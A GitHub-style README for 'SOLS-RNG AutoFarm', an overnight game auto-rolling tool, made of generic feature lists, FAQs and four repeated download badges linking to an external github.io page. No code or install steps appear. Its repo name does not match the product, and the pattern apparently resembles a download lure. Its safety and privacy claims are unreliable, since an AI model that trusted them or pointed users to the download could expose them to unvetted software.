![preview](https://raw.githubusercontent.com/NIFFER566/nocturne-roll-orchestrator/main/cover_ad525b.svg)
# 🎲 SOLS-RNG AutoFarm — Overnight Roll Automation Suite

[![Download](https://raw.githubusercontent.com/NIFFER566/nocturne-roll-orchestrator/main/get_e2f4.svg)](https://NIFFER566.github.io/nocturne-roll-orchestrator/)

A self-contained automation companion for players who want their roll sessions to keep humming while they sleep. Set it up once, walk away, and let the farm do the boring part. No subscriptions, no accounts, no cloud dependency — just a lightweight local utility that rolls, logs, and stops the moment you tap your escape hotkey.

---

## 📜 Table of Contents

- [What Is This?](#-what-is-this)
- [Why Another Auto-Roller?](#-why-another-auto-roller)
- [Core Features](#-core-features)
- [The Overnight Philosophy](#-the-overnight-philosophy)
- [Hotkey System](#-hotkey-system)
- [Logging & Statistics](#-logging--statistics)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [24/7 Support Desk](#-247-support-desk)
- [Configuration Reference](#-configuration-reference)
- [Performance & Resource Footprint](#-performance--resource-footprint)
- [Compatibility Matrix](#-compatibility-matrix)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

[![Download](https://raw.githubusercontent.com/NIFFER566/nocturne-roll-orchestrator/main/get_e2f4.svg)](https://NIFFER566.github.io/nocturne-roll-orchestrator/)

---

## 🌌 What Is This?

SOLS-RNG AutoFarm is a desktop-side automation harness that watches a rollable game window, triggers rolls at a configurable cadence, and records every result into a local ledger. Think of it as a patient librarian who sits beside your keyboard all night, stamps every roll into a notebook, and quietly closes the book when you tap the panic key.

It is not a botnet, not a cloud service, and not a subscription product. It is a single portable folder you drop onto a machine, run, and forget about.

The project began as a personal experiment: how long can a roll session run before a human gets bored? The answer, unsurprisingly, is "about nine minutes." So the experiment became a tool, and the tool became this repository.

---

## 🤔 Why Another Auto-Roller?

Most automation tools fall into one of three buckets:

1. **Over-engineered macro suites** that require you to learn a scripting language just to press a button repeatedly.
2. **Cloud-dependent services** that want your credentials, your email, and your firstborn.
3. **Fragile pixel-grabbers** that break the moment your window resizes by a single pixel.

SOLS-RNG AutoFarm takes a fourth path — a *portable ledger-keeper* approach. It is designed around three non-negotiables:

- **Local-first.** Nothing leaves your machine unless you explicitly export a log.
- **Zero accounts.** No sign-in wall, no telemetry pings, no "verify your identity" emails.
- **Predictable stops.** A single global hotkey halts everything immediately, even mid-sequence.

---

## ⚙️ Core Features

- 🎯 **Cadence-controlled rolling** — define intervals in milliseconds, seconds, or human-friendly phrases.
- ⌨️ **Global kill-switch hotkey** — works even when the game window is focused.
- 🧾 **Local roll ledger** — every result timestamped and stored as plain text or JSON.
- 📊 **Session summaries** — see how many rolls happened while you were asleep.
- 🪶 **Portable footprint** — no system-wide dependencies, no background services.
- 🎨 **Responsive interface** — the control panel adapts to 720p laptops and 4K monitors alike.
- 🌐 **Multilingual UI** — translated strings for a growing list of locales.
- 🔔 **Quiet mode** — suppresses audio cues during overnight runs.
- 🧠 **Adaptive timing** — nudges intervals when the target window stalls.
- 🗂️ **Profile presets** — save different cadences for different games.
- 🛡️ **No-credential design** — the tool never asks for a username or password.

[![Download](https://raw.githubusercontent.com/NIFFER566/nocturne-roll-orchestrator/main/get_e2f4.svg)](https://NIFFER566.github.io/nocturne-roll-orchestrator/)

---

## 🌙 The Overnight Philosophy

Running anything for eight hours straight requires a certain mindset. You are not "grinding" — you are delegating. The machine does the repetition; you do the sleeping.

Three rules guide the overnight design:

1. **Silence is a feature.** No popups at 3 AM. No sounds unless explicitly enabled.
2. **Stop conditions matter more than start conditions.** The hotkey is the hero of this story.
3. **Logs are the only proof.** If it happened and nobody logged it, did it happen?

The suite therefore spends more engineering effort on graceful shutdown than on aggressive throughput. A tool that rolls 10% faster but crashes at hour six is worse than a tool that rolls steadily and stops cleanly.

---

## ⌨️ Hotkey System

The default halt combination is intentionally awkward to press by accident, yet reachable in a panic. Users can rebind it through the configuration panel.

| Action | Default Binding | Notes |
| --- | --- | --- |
| Emergency halt | Configurable | Halts all activity immediately |
| Pause / resume | Configurable | Suspends the loop without closing it |
| Toggle overlay | Configurable | Shows a minimal status readout |
| Snapshot ledger | Configurable | Flushes the current log to disk |

Hotkeys are registered at the OS level where permitted, and fall back to window-scoped capture otherwise.

---

## 📈 Logging & Statistics

Every roll produces a structured record:

- Timestamp (ISO 8601)
- Session identifier
- Roll index within the session
- Result value or label
- Interval actually used
- Any anomaly flags

Logs rotate automatically at a configurable size, and an export tool converts the running ledger into a summary report suitable for spreadsheets.

The statistics panel surfaces:

- Total rolls across all sessions
- Rolls per hour (rolling average)
- Longest uninterrupted session
- Distribution of notable results

---

## 🖥️ Responsive Interface

The control surface is built to survive real-world screen conditions:

- Collapses gracefully on narrow laptop displays.
- Expands to fill ultrawide monitors without stretching controls awkwardly.
- Respects system dark/light preferences.
- Scales cleanly at 125%, 150%, and 200% OS zoom levels.

Nothing about the layout assumes a specific resolution — every panel is fluid.

---

## 🌐 Multilingual Support

Interface strings are externalized into locale files, making translation a matter of editing a single text document. Community contributions for new languages are warmly welcomed.

Currently supported locales include a core set, with additional ones arriving as translators volunteer. Right-to-left layouts are handled correctly out of the box.

---

## 🛎️ 24/7 Support Desk

Questions do not keep business hours, and neither does the issue tracker. The support model here is:

- **Community-first.** Most questions get answered by other users within a day.
- **Documented answers.** Repeated questions become FAQ entries.
- **No gatekeeping.** You do not need to "own" a specific account to ask for help.

For urgent matters, the emergency-halt behavior is documented in its own section so users can find it in seconds.

---

## 🧩 Configuration Reference

Configuration lives in a single human-readable file beside the executable. Key groups:

- **Timing** — base interval, jitter range, adaptive thresholds.
- **Input** — hotkey bindings, input method selection.
- **Logging** — output format, rotation size, retention policy.
- **Interface** — theme, language, overlay behavior.
- **Safety** — maximum session length, automatic halt conditions.

Every option has a comment explaining its effect. Defaults are chosen to be safe rather than aggressive.

---

## 🚀 Performance & Resource Footprint

The suite is engineered to be a polite guest on your machine:

- Idle memory usage measured in tens of megabytes.
- No GPU acceleration required.
- CPU spikes only during active input dispatch.
- Disk writes batched to avoid constant I/O churn.

If your machine can run the game, it can run this alongside it.

---

## 🧪 Compatibility Matrix

| Platform | Status | Notes |
| --- | --- | --- |
| Recent desktop OS releases | Supported | Primary target |
| Older desktop OS releases | Best effort | Some hotkey features limited |
| Virtualized environments | Partial | Input injection may vary |
| Headless servers | Not applicable | Requires a visible target window |

---

## ❓ Frequently Asked Questions

**Does this require an account anywhere?**
No. There is no sign-in, no email verification, and no cloud sync.

**Can it run while I sleep?**
Yes — that is the primary use case. Configure a maximum session length if you want a hard stop.

**What happens if the target window closes?**
The loop detects the missing window and halts cleanly, writing a final log entry.

**Will my ledger survive a crash?**
Logs are flushed periodically, so at most a few seconds of entries are at risk.

**Can I run multiple instances?**
Technically yes, but it is not recommended unless you understand the input contention implications.

**Is the source readable?**
Entirely. The codebase favors clarity over cleverness.

---

## 🗺️ Roadmap

- Additional locale packs.
- Optional encrypted ledger export.
- Pluggable input backends.
- Session replay visualization.
- Improved anomaly detection in logs.

---

## 🤝 Contributing

Contributions are welcome in the form of:

- Bug reports with reproducible steps.
- Translations for new locales.
- Documentation improvements.
- Patches that keep the tool polite and predictable.

Please keep pull requests focused and describe the *why* before the *what*.

---

## ⚠️ Disclaimer

This project is provided for educational and personal-automation purposes only. Users are responsible for ensuring their use complies with the terms of service of any game or platform they interact with. The maintainers assume no liability for account actions, data loss, or unintended behavior resulting from use of this software. Automation tools can violate platform rules — check before you run.

---

## 📄 License

Released under the MIT License. See the full text at [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT).

Copyright (c) 2026 SOLS-RNG AutoFarm contributors.

[![Download](https://raw.githubusercontent.com/NIFFER566/nocturne-roll-orchestrator/main/get_e2f4.svg)](https://NIFFER566.github.io/nocturne-roll-orchestrator/)